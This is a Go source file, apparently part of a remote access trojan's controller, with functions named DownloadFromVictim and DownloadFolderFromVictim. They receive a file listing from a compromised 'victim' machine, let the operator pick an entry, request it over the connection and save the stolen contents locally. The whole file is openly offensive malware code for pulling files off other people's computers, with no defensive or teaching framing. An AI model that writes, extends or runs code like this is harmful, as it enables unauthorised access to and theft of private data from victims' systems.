package Download

import (
	"bufio"
	"encoding/gob"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
)

type FilesList struct {
	Files []string
}

type Data struct {
	FileName    string
	FileSize    int
	FileContent []byte
}

func DownloadFromVictim(connection net.Conn) (err error) {

	filesStruct := &FilesList{}

	decoder := gob.NewDecoder(connection)

	err = decoder.Decode(filesStruct)
	for index, fileName := range filesStruct.Files {
		fmt.Println("\t", index, "\t", fileName)
	}

	//fmt.Println("\t", "99", "\t", "Exit")

	fmt.Print("[+] Select file: ")
	reader := bufio.NewReader(os.Stdin)

	file2DownloadIndex_raw, err := reader.ReadString('\n')
	file2DownloadIndex := strings.TrimSuffix(file2DownloadIndex_raw, "\n")

	/*if file2DownloadIndex == "99" {
		return
	}*/

	file_index, _ := strconv.Atoi(file2DownloadIndex)

	FileName := filesStruct.Files[file_index]

	nbyte, err := connection.Write([]byte(FileName + "\n"))
	fmt.Println("[+] File name sent: ", nbyte)

	//decoder := gob.NewDecoder(connection)

	fs := &Data{}
	err = decoder.Decode(fs)

	file, err := os.Create(fs.FileName)
	nbytes, err := file.Write(fs.FileContent)
	fmt.Println("[+] File downloaded successfully, ", nbytes)

	return
}

func DownloadFolderFromVictim(connection net.Conn) (err error) {
	filesStruct := &FilesList{}

	decoder := gob.NewDecoder(connection)

	err = decoder.Decode(filesStruct)
	for index, folderName := range filesStruct.Files {
		fmt.Println("\t", index, "\t", folderName)
	}

	fmt.Print("[+] Select folder: ")
	reader := bufio.NewReader(os.Stdin)

	folder2DownloadIndex_raw, err := reader.ReadString('\n')
	folder2DownloadIndex := strings.TrimSuffix(folder2DownloadIndex_raw, "\n")

	folder_index, _ := strconv.Atoi(folder2DownloadIndex)

	FolderName := filesStruct.Files[folder_index]

	nbyte, err := connection.Write([]byte(FolderName + "\n"))
	fmt.Println("[+] Folder name sent: ", nbyte)

	return
}
